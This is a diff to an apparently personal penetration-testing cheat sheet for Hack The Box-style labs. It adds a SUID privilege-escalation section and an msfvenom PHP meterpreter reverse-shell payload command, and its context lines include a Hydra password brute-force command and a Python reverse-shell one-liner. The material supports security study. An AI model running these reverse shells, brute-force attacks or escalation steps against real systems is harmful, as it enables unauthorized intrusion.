@@ -32,13 +32,16 @@ echo os.system('/bin/bash')
 ### Fireforce
 > brute-force attacks on GET or POST forms
 
+### Poster
+> A developer tool for interacting with web services and other web resources that lets you make HTTP requests, set the entity body, and content type. 
+
 ## Brute-force techniques
 ### THC Hydra
 ```bash
 # hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
 ```
 ## Docker
-### Install Docker
+### Install Docker on Kali
 #### Add Docker PGP key:
 
 ```bash
@@ -110,3 +113,22 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
+## Linux Privilege escalation
+### Checking SUID files available in the system by running
+> SUID(Set owner User ID up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file ownerâs permissions as well as owner UID and GID when executing a file/program/command
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -perm +4000 2> /dev/null
+```
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Set and Unset SUID on files:
+```bash
+$ sudo chmod u+s /usr/bin/whoami # set SUID for whoami
+
+$ sudo chmod u-s /usr/bin/whoami # Unset SUID
+```
+### Reverse shell payload using msfvenom
+```bash
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.172.4 lport=443 -f raw
+```
